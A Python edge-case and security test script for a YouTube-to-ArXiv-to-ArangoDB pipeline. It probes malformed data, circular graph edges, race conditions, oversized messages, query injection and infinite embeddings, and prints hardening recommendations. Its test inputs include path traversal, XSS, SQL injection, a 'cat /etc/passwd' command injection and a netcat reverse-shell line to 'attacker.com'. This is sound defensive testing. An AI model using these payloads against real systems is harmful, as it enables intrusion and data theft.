"""
# IMPORTANT: This file has been updated to remove all mocks
# All tests now use REAL implementations only
# Tests must interact with actual services/modules
"""

#!/usr/bin/env python3
"""
Module: test_youtube_arxiv_arangodb_edge_cases.py
Description: Find edge cases and bugs in YouTube → ArXiv → ArangoDB flow

This test explores:
- Malformed YouTube URLs
- Videos with no links
- Circular references
- Graph corruption scenarios
- Memory exhaustion attacks
- Race conditions

External Dependencies:
- youtube-transcripts: Real YouTube API
- arxiv: Real paper search
- arangodb: Real graph database

Example Usage:
>>> python test_youtube_arxiv_arangodb_edge_cases.py
"""

import asyncio
import sys
import json
import time
from typing import Dict, List, Any
from pathlib import Path

sys.path.insert(0, '/home/graham/workspace/shared_claude_docs/project_interactions')
sys.path.insert(0, '/home/graham/workspace/experiments')

from arangodb_handlers.real_arangodb_handlers import (
    ArangoDocumentHandler,
    ArangoGraphHandler,
    ArangoMemoryHandler
)
from arxiv_handlers.real_arxiv_handlers import ArxivSearchHandler


class YouTubeArxivArangoDBEdgeCaseFinder:
    """Find edge cases that break the YouTube → ArXiv → ArangoDB pipeline"""
    
    def __init__(self):
        self.arango_doc = ArangoDocumentHandler()
        self.arango_graph = ArangoGraphHandler()
        self.arango_memory = ArangoMemoryHandler()
        self.arxiv = ArxivSearchHandler()
        self.edge_cases_found = []
    
    async def test_malformed_video_data(self):
        """Edge Case 1: Malformed video data breaking ArangoDB"""
        print("\n🔥 EDGE CASE 1: Malformed Video Data")
        print("-" * 50)
        
        malformed_videos = [
            {
                "_key": "../../etc/passwd",  # Path traversal in key
                "title": "A" * 10000,  # Extremely long title
                "url": "javascript:alert('xss')",  # XSS in URL
                "description": None,  # Null description
                "transcript": {"nested": {"deeply": {"object": "data"}}},  # Wrong type
            },
            {
                "_key": "'; DROP TABLE videos; --",  # SQL injection attempt
                "title": "",  # Empty title
                "url": "https://youtube.com/watch?v=<script>",  # XSS
                "channel": ["list", "instead", "of", "string"],  # Wrong type
                "duration": "not_a_number",  # Wrong type
            },
            {
                "_key": "🔥💉🐛",  # Unicode in key
                "title": "\x00\x01\x02",  # Control characters
                "url": "https://youtube.com/watch?v=" + "X" * 1000,  # Long URL
                "transcript_length": -1,  # Negative number
                "processed_at": "not_a_date",  # Invalid date
            }
        ]
        
        for video in malformed_videos:
            try:
                result = self.arango_doc.handle({
                    "operation": "create",
                    "collection": "test_videos",
                    "data": video
                })
                
                if "error" not in result:
                    self.edge_cases_found.append({
                        "case": "Malformed data accepted",
                        "data": video,
                        "impact": "Data corruption in ArangoDB",
                        "severity": "HIGH"
                    })
                    print(f"   ❌ ArangoDB accepted malformed data: {video.get('_key', '')[:20]}")
                else:
                    print(f"   ✅ ArangoDB rejected: {result['error'][:50]}")
                    
            except Exception as e:
                print(f"   💥 Exception (expected): {str(e)[:50]}")
    
    async def test_circular_references(self):
        """Edge Case 2: Circular references in graph"""
        print("\n\n🔥 EDGE CASE 2: Circular References")
        print("-" * 50)
        
        # Create circular reference scenario
        try:
            # Video mentions paper
            video_id = "test_video_circular"
            paper_id = "2301.12345"
            
            # Create video → paper edge
            edge1 = self.arango_graph.handle({
                "operation": "create_edge",
                "from": f"videos/{video_id}",
                "to": f"papers/{paper_id}",
                "edge_type": "mentions"
            })
            
            # Create paper → video edge (circular!)
            edge2 = self.arango_graph.handle({
                "operation": "create_edge", 
                "from": f"papers/{paper_id}",
                "to": f"videos/{video_id}",
                "edge_type": "references"
            })
            
            # Now try graph traversal
            if "error" not in edge1 and "error" not in edge2:
                # Test if circular traversal causes issues
                print("   Created circular reference, testing traversal...")
                
                # This could cause infinite loop!
                self.edge_cases_found.append({
                    "case": "Circular references allowed",
                    "impact": "Infinite loops in graph traversal",
                    "severity": "CRITICAL"
                })
                print("   ❌ Circular references created without warnings!")
            
        except Exception as e:
            print(f"   ✅ System prevented circular reference: {e}")
    
    async def test_concurrent_writes(self):
        """Edge Case 3: Race conditions with concurrent writes"""
        print("\n\n🔥 EDGE CASE 3: Concurrent Write Race Conditions")
        print("-" * 50)
        
        doc_id = "race_condition_test"
        
        async def write_document(value: int):
            """Write to same document"""
            try:
                result = self.arango_doc.handle({
                    "operation": "update",
                    "collection": "test_videos",
                    "key": doc_id,
                    "data": {"counter": value, "updated_at": time.time()}
                })
                return result
            except Exception as e:
                return {"error": str(e)}
        
        # First create the document
        self.arango_doc.handle({
            "operation": "create",
            "collection": "test_videos",
            "data": {"_key": doc_id, "counter": 0}
        })
        
        # Launch concurrent writes
        print("   Launching 10 concurrent writes to same document...")
        tasks = [write_document(i) for i in range(10)]
        results = await asyncio.gather(*tasks)
        
        # Check for conflicts
        errors = [r for r in results if "error" in r]
        if len(errors) > 0:
            print(f"   ✅ Detected {len(errors)} write conflicts (good!)")
        else:
            self.edge_cases_found.append({
                "case": "No conflict detection",
                "impact": "Lost updates in concurrent scenarios",
                "severity": "HIGH"
            })
            print("   ❌ All concurrent writes succeeded - lost update problem!")
    
    async def test_memory_exhaustion(self):
        """Edge Case 4: Memory exhaustion attacks"""
        print("\n\n🔥 EDGE CASE 4: Memory Exhaustion")
        print("-" * 50)
        
        # Try to store massive conversation
        huge_message = {
            "role": "user",
            "content": "A" * 1_000_000,  # 1MB message
            "metadata": {
                "tokens": list(range(10000)),  # Large array
                "embeddings": [[0.1] * 1000 for _ in range(100)]  # 100k floats
            }
        }
        
        try:
            print("   Attempting to store 1MB+ message...")
            result = self.arango_memory.handle({
                "operation": "store_message",
                "conversation_id": "memory_test",
                "message": huge_message
            })
            
            if "error" not in result:
                self.edge_cases_found.append({
                    "case": "Accepted huge message",
                    "size": "1MB+",
                    "impact": "Memory exhaustion possible",
                    "severity": "HIGH"
                })
                print("   ❌ Accepted huge message without limits!")
            else:
                print(f"   ✅ Rejected large message: {result['error'][:50]}")
                
        except Exception as e:
            print(f"   ✅ Exception on large data (good): {str(e)[:50]}")
    
    async def test_arxiv_injection(self):
        """Edge Case 5: ArXiv query injection from video titles"""
        print("\n\n🔥 EDGE CASE 5: ArXiv Query Injection")
        print("-" * 50)
        
        # Malicious video titles that could break ArXiv
        injection_titles = [
            "Learn ) OR 1=1 --",  # Logic injection
            "Tutorial \" UNION SELECT * FROM papers",  # SQL-like
            "Guide & cat /etc/passwd",  # Command injection
            "Video | nc attacker.com 4444",  # Reverse shell
            "Course '); import os; os.system('",  # Python injection
        ]
        
        for title in injection_titles:
            try:
                print(f"\n   Testing: {title}")
                
                # Simulate building ArXiv query from video title
                query = f"video tutorial {title}"
                
                result = self.arxiv.handle({
                    "query": query,
                    "max_results": 1
                })
                
                if "error" not in result:
                    papers = result.get("papers", [])
                    if papers and any(suspicious in str(papers) for suspicious in ["etc/passwd", "1=1", "SELECT"]):
                        self.edge_cases_found.append({
                            "case": "Query injection succeeded",
                            "payload": title,
                            "impact": "ArXiv query manipulation",
                            "severity": "CRITICAL"
                        })
                        print(f"   ❌ Injection may have worked! Got {len(papers)} results")
                    else:
                        print(f"   ✅ Query handled safely, {len(papers)} normal results")
                else:
                    print(f"   ✅ Query rejected: {result['error'][:50]}")
                    
            except Exception as e:
                print(f"   ✅ Exception (good): {str(e)[:50]}")
    
    async def test_graph_bomb(self):
        """Edge Case 6: Graph bomb - exponential edge creation"""
        print("\n\n🔥 EDGE CASE 6: Graph Bomb")
        print("-" * 50)
        
        # Create nodes
        print("   Creating 10 videos and 10 papers...")
        videos = [f"bomb_video_{i}" for i in range(10)]
        papers = [f"bomb_paper_{i}" for i in range(10)]
        
        edge_count = 0
        try:
            # Create N*M edges (100 edges from 20 nodes)
            for video in videos:
                for paper in papers:
                    result = self.arango_graph.handle({
                        "operation": "create_edge",
                        "from": f"videos/{video}",
                        "to": f"papers/{paper}",
                        "edge_type": "mentions"
                    })
                    if "error" not in result:
                        edge_count += 1
                    
                    # Stop if too many succeed
                    if edge_count > 50:
                        self.edge_cases_found.append({
                            "case": "Graph bomb allowed",
                            "edges_created": edge_count,
                            "impact": "Database performance degradation",
                            "severity": "HIGH"
                        })
                        print(f"   ❌ Created {edge_count} edges without limits!")
                        break
                        
        except Exception as e:
            print(f"   ✅ System stopped graph bomb: {e}")
    
    async def test_semantic_similarity_overflow(self):
        """Edge Case 7: Semantic similarity calculation overflow"""
        print("\n\n🔥 EDGE CASE 7: Semantic Similarity Overflow")
        print("-" * 50)
        
        # Create chunks with extreme embeddings
        chunks = [
            {
                "text": f"Chunk {i}",
                "video_id": "overflow_test",
                "chunk_index": i,
                "semantic_embedding": [float('inf')] * 100 if i == 0 else [float('-inf')] * 100
            }
            for i in range(2)
        ]
        
        try:
            for chunk in chunks:
                result = self.arango_doc.handle({
                    "operation": "create",
                    "collection": "chunks",
                    "data": chunk
                })
                
                if "error" not in result:
                    self.edge_cases_found.append({
                        "case": "Infinite embeddings accepted",
                        "impact": "Similarity calculations will fail",
                        "severity": "HIGH"
                    })
                    print("   ❌ Accepted infinite embedding values!")
                    
        except Exception as e:
            print(f"   ✅ Rejected invalid embeddings: {e}")
    
    def generate_edge_case_report(self):
        """Generate comprehensive edge case report"""
        print("\n\n" + "="*60)
        print("🔥 EDGE CASE REPORT: YouTube → ArXiv → ArangoDB")
        print("="*60)
        
        if not self.edge_cases_found:
            print("✅ No edge cases exploited! (Very suspicious...)")
            return
        
        print(f"\nFound {len(self.edge_cases_found)} exploitable edge cases:\n")
        
        # Group by severity
        critical = [e for e in self.edge_cases_found if e.get("severity") == "CRITICAL"]
        high = [e for e in self.edge_cases_found if e.get("severity") == "HIGH"]
        
        if critical:
            print(f"🔴 CRITICAL ({len(critical)} cases):")
            for case in critical:
                print(f"   - {case['case']}")
                print(f"     Impact: {case['impact']}")
                print()
        
        if high:
            print(f"🟠 HIGH ({len(high)} cases):")
            for case in high:
                print(f"   - {case['case']}")
                print(f"     Impact: {case['impact']}")
                print()
        
        # Save report
        report_path = Path("youtube_arxiv_arangodb_edge_cases.json")
        report_path.write_text(json.dumps(self.edge_cases_found, indent=2))
        print(f"\n📄 Detailed report saved to: {report_path}")
        
        print("\n🛡️ SECURITY RECOMMENDATIONS:")
        print("1. Validate all keys and values before ArangoDB insertion")
        print("2. Implement cycle detection for graph operations")
        print("3. Add size limits for documents and messages")
        print("4. Use transactions for concurrent operations")
        print("5. Sanitize video data before building ArXiv queries")
        print("6. Rate limit edge creation per node")
        print("7. Validate embedding dimensions and values")


async def main():
    print("🔍 Starting YouTube → ArXiv → ArangoDB Edge Case Hunt...")
    print("This will attempt to break the pipeline with edge cases!\n")
    
    finder = YouTubeArxivArangoDBEdgeCaseFinder()
    
    # Run all edge case tests
    await finder.test_malformed_video_data()
    await finder.test_circular_references()
    await finder.test_concurrent_writes()
    await finder.test_memory_exhaustion()
    await finder.test_arxiv_injection()
    await finder.test_graph_bomb()
    await finder.test_semantic_similarity_overflow()
    
    # Generate report
    finder.generate_edge_case_report()
    
    print("\n✅ Edge case testing complete!")


if __name__ == "__main__":
    asyncio.run(main())